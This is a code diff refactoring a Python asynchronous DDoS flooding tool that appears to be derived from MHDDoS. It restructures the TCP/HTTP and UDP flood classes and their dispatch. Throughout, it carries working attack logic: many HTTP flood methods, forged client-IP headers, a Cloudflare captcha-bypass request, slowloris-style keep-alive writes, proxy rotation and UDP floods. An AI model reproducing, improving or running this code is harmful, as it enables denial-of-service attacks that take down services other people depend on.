@@ -11,7 +11,7 @@ from os import urandom as randbytes
 from socket import (inet_ntoa, SO_LINGER, SO_RCVBUF, SOL_SOCKET)
 from ssl import CERT_NONE, create_default_context, SSLContext
 from string import ascii_letters
-from typing import Callable, Optional, Set, Tuple
+from typing import Callable, Optional, Tuple
 from urllib import parse
 
 import aiohttp
@@ -20,8 +20,10 @@ from OpenSSL import SSL
 from yarl import URL
 
 from . import proxy_proto
+from .core import Methods
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import NoProxySet, ProxySet
+from .targets import Target
 from .vendor.referers import REFERERS
 from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
 from .vendor.useragents import USERAGENTS
@@ -62,26 +64,6 @@ trex_ctx.set_cipher_list(b"RSA")
 trex_ctx.set_verify(SSL.VERIFY_NONE, None)
 
 
-class Methods:
-    HTTP_METHODS: Set[str] = {
-        "CFB", "BYPASS", "GET", "RGET", "HEAD", "RHEAD", "POST", "STRESS", "DYN", "SLOW",
-        "NULL", "COOKIE", "PPS", "EVEN", "AVB",
-        "APACHE", "XMLRPC", "DOWNLOADER", "RHEX", "STOMP",
-        # this is not HTTP method (rather TCP) but this way it works with --http-methods
-        # settings being applied to the entire set of targets
-        "TREX"
-    }
-    TCP_METHODS: Set[str] = {"TCP", }
-    UDP_METHODS: Set[str] = {
-        "UDP", "VSE", "FIVEM", "TS3", "MCPE",
-        # the following methods are temporarily disabled for further investigation and testing
-        # "SYN", "CPS",
-        # Amplification
-        # "ARD", "CHAR", "RDP", "CLDAP", "MEM", "DNS", "NTP"
-    }
-    ALL_METHODS: Set[str] = {*HTTP_METHODS, *UDP_METHODS, *TCP_METHODS}
-
-
 class Tools:
     @staticmethod
     def humanbits(i: int) -> str:
@@ -106,7 +88,8 @@ class Tools:
             return '0'
 
     @staticmethod
-    def parse_params(url, ip, proxies):
+    def parse_params(target: Target, proxies):
+        url, ip = target.url, target.addr
         result = url.host.lower().endswith(rotate_suffix)
         if result:
             return random.choice(rotate_params), NoProxySet
@@ -152,7 +135,36 @@ class AttackSettings:
         return settings
 
 
-class AsyncTcpFlood:
+class FloodBase:
+    def __init__(
+        self,
+        target: Target,
+        method: str,
+        url: URL,
+        addr: str,
+        proxies: ProxySet,
+        loop,
+        settings: AttackSettings
+    ):
+        self._target = target
+        self._method = method
+        self._url = url
+        self._addr = addr
+        self._proxies = proxies
+        self._loop = loop
+        self._settings = settings
+
+        self._raw_address = (self._addr, (self._url.port or 80))
+        self.SENT_FLOOD = getattr(self, self._method)
+
+    @property
+    def desc(self) -> Tuple[str, int, str]:
+        # Original description
+        url = self._target.url
+        return url.host, url.port, self._method
+
+
+class AsyncTcpFlood(FloodBase):
 
     BASE_HEADERS = (
         'Accept-Encoding: gzip, deflate, br\r\n'
@@ -168,43 +180,22 @@ class AsyncTcpFlood:
         'Upgrade-Insecure-Requests: 1\r\n'
     )
 
-    def __init__(
-        self,
-        target: URL,
-        addr: str,
-        method: str,
-        proxies: ProxySet,
-        loop,
-        settings: AttackSettings
-    ) -> None:
-        self._target = target
-        self._addr = addr
-        self._raw_target = (self._addr, (self._target.port or 80))
-        self._proxies = proxies
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
         self._req_type = (
-            "POST" if method.upper() in {"POST", "XMLRPC", "STRESS"}
-            else "HEAD" if method.upper() in {"HEAD", "RHEAD"}
+            "POST" if self._method in {"POST", "XMLRPC", "STRESS"}
+            else "HEAD" if self._method in {"HEAD", "RHEAD"}
             else "GET"
         )
 
-        self._method = method
-        self.SENT_FLOOD = getattr(self, method)
-
-        self._loop = loop
-        self._settings = settings
-
-    @property
-    def desc(self) -> Tuple[str, int, str]:
-        return (self._target.host, self._target.port, self._method)
-
     @property
     def is_tls(self):
-        return self._target.scheme.lower() == "https" or self._target.port == 443
+        return self._url.scheme.lower() == "https" or self._url.port == 443
 
     def spoof_ip(self) -> str:
         spoof: str = Tools.rand_ipv4()
         return (
-            f"X-Forwarded-Host: {self._target.raw_host}\r\n"
+            f"X-Forwarded-Host: {self._url.raw_host}\r\n"
             f"Via: {spoof}\r\n"
             f"Client-IP: {spoof}\r\n"
             f'X-Forwarded-Proto: https\r\n'
@@ -215,23 +206,23 @@ class AsyncTcpFlood:
     def random_headers(self) -> str:
         return (
             f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
+            f"Referer: {random.choice(REFERERS)}{parse.quote(self._url.human_repr())}\r\n" +
             self.spoof_ip()
         )
 
     def default_headers(self) -> str:
         return (
-            f"Host: {self._target.authority}\r\n"
+            f"Host: {self._url.authority}\r\n"
             + self.BASE_HEADERS
             + self.random_headers()
         )
 
     @property
     def default_path_qs(self):
-        return self._target.raw_path_qs
+        return self._url.raw_path_qs
 
     def add_rand_query(self, path_qs) -> str:
-        if self._target.raw_query_string:
+        if self._url.raw_query_string:
             path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
         else:
             path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
@@ -282,7 +273,7 @@ class AsyncTcpFlood:
             conn = self._loop.create_connection(
                 flood_proto,
                 host=self._addr,
-                port=self._target.port,
+                port=self._url.port,
                 ssl=ssl_ctx,
                 server_hostname=server_hostname
             )
@@ -293,7 +284,7 @@ class AsyncTcpFlood:
                 self._proxies,
                 self._loop,
                 on_close,
-                self._raw_target,
+                self._raw_address,
                 ssl_ctx,
                 downstream_factory=flood_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
@@ -332,6 +323,7 @@ class AsyncTcpFlood:
                 ),
                 body='{"data": "%s"}' % Tools.rand_str(32)
             ) * self._settings.requests_per_buffer
+
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
@@ -349,6 +341,7 @@ class AsyncTcpFlood:
                 ),
                 body='{"data": "%s"}' % Tools.rand_str(512)
             ) * self._settings.requests_per_buffer
+
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
@@ -395,13 +388,13 @@ class AsyncTcpFlood:
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
-        payload = self.build_request(headers=f"Host: {self._target.authority}\r\n")
+        payload = self.build_request(headers=f"Host: {self._url.authority}\r\n")
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
             headers=(
-                "Host: %s.%s\r\n" % (Tools.rand_str(6), self._target.authority)
+                "Host: %s.%s\r\n" % (Tools.rand_str(6), self._url.authority)
                 + self.BASE_HEADERS
                 + self.random_headers()
             )
@@ -410,9 +403,9 @@ class AsyncTcpFlood:
 
     async def NULL(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
-            path_qs=self._target.raw_path_qs,
+            path_qs=self._url.raw_path_qs,
             headers=(
-                f"Host: {self._target.authority}\r\n"
+                f"Host: {self._url.authority}\r\n"
                 "User-Agent: null\r\n"
                 "Referer: null\r\n"
                 + self.BASE_HEADERS
@@ -427,7 +420,7 @@ class AsyncTcpFlood:
         cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
         async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
             for _ in range(self._settings.requests_per_connection):
-                async with s.get(self._target.human_repr()) as response:
+                async with s.get(self._url.human_repr()) as response:
                     if on_connect and not on_connect.done():
                         on_connect.set_result(True)
                     packets_sent += 1
@@ -484,8 +477,8 @@ class AsyncTcpFlood:
             while True:
                 yield FloodOp.WRITE, (packet, packet_size, 1)
                 yield FloodOp.READ, 1
-                # XXX: note this weid break in the middle of the code:
-                #        https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
+                # XXX: note this weird break in the middle of the code:
+                #      https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L1072
                 #      this attack has to be re-tested
                 keep = str.encode("X-a: %d\r\n" % random.randint(1, 5000))
                 yield FloodOp.WRITE, (keep, len(keep), 1)
@@ -526,9 +519,9 @@ class AsyncTcpFlood:
         #      to do a hex here instead of just wrapping into str
         randhex: str = str(randbytes(random.choice([32, 64, 128])))
         packet = self.build_request(
-            path_qs=f'{self._target.authority}/{randhex}',
+            path_qs=f'{self._url.authority}/{randhex}',
             headers=(
-                f"Host: {self._target.authority}/{randhex}\r\n"
+                f"Host: {self._url.authority}/{randhex}\r\n"
                 + self.BASE_HEADERS
                 + self.random_headers()
             )
@@ -553,15 +546,15 @@ class AsyncTcpFlood:
         )
 
         p1: bytes = self.build_request(
-            path_qs=f'{self._target.authority}/{hexh}',
+            path_qs=f'{self._url.authority}/{hexh}',
             headers=(
-                f"Host: {self._target.authority}/{hexh}\r\n"
+                f"Host: {self._url.authority}/{hexh}\r\n"
                 + self.BASE_HEADERS
                 + self.random_headers()
             )
         )
         p2: bytes = self.build_request(
-            path_qs=f'{self._target.authority}/cdn-cgi/l/chk_captcha',
+            path_qs=f'{self._url.authority}/cdn-cgi/l/chk_captcha',
             headers=(
                 f"Host: {hexh}\r\n"
                 + self.BASE_HEADERS
@@ -591,16 +584,15 @@ class AsyncTcpFlood:
         )
         proxy_url: Optional[str] = self._proxies.pick_random()
         if proxy_url is None:
-            addr, port = self._raw_target
+            addr, port = self._raw_address
             conn = self._loop.create_connection(trex_proto, host=addr, port=port, ssl=None)
         else:
             proxy, proxy_protocol = proxy_proto.for_proxy(proxy_url)
-            on_socket = self._loop.create_future()
             trex_proto = partial(
                 proxy_protocol,
                 self._loop,
                 on_close,
-                self._raw_target,
+                self._raw_address,
                 None,
                 downstream_factory=trex_proto,
                 connect_timeout=self._settings.dest_connect_timeout_seconds,
@@ -637,29 +629,7 @@ class AsyncTcpFlood:
                 transport.abort()
 
 
-class AsyncUdpFlood:
-
-    def __init__(
-        self,
-        target: Tuple[str, int],
-        method: str,
-        proxies: ProxySet,
-        loop,
-        settings: AttackSettings,
-    ):
-        self._target = target
-        self._proxies = proxies
-        self._loop = loop
-        self._settings = settings
-
-        self._method = method
-        self.SENT_FLOOD = getattr(self, method)
-
-    @property
-    def desc(self) -> Tuple[str, int, str]:
-        addr, port = self._target
-        return (addr, port, self._method)
-
+class AsyncUdpFlood(FloodBase):
     async def run(self) -> bool:
         return await self.SENT_FLOOD()
 
@@ -669,7 +639,7 @@ class AsyncUdpFlood:
         async with async_timeout.timeout(self._settings.connect_timeout_seconds):
             transport, _ = await self._loop.create_datagram_endpoint(
                 partial(DatagramFloodIO, self._loop, packet_gen, on_close),
-                remote_addr=self._target
+                remote_addr=self._raw_address
             )
         try:
             return bool(await on_close)
@@ -710,26 +680,28 @@ class AsyncUdpFlood:
         return await self._generic_flood(lambda: (packet, packet_size))
 
 
-def main(url, ip, method, proxies, loop=None, settings=None):
-    if method not in Methods.ALL_METHODS:
-        raise RuntimeError(f"Method {method} Not Found")
-
-    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
+def main(target, method, proxies, loop, settings):
+    (url, ip), proxies = Tools.parse_params(target, proxies)
     if method in {*Methods.HTTP_METHODS, *Methods.TCP_METHODS}:
         return AsyncTcpFlood(
+            target,
+            method,
             url,
             ip,
-            method,
             proxies,
             loop=loop,
             settings=settings,
         )
 
-    if method in Methods.UDP_METHODS:
+    elif method in Methods.UDP_METHODS:
         return AsyncUdpFlood(
-            (ip, url.port),
+            target,
             method,
+            url,
+            ip,
             proxies,
             loop=loop,
             settings=settings
         )
+    else:
+        raise RuntimeError(f'Invalid method {target.method}')
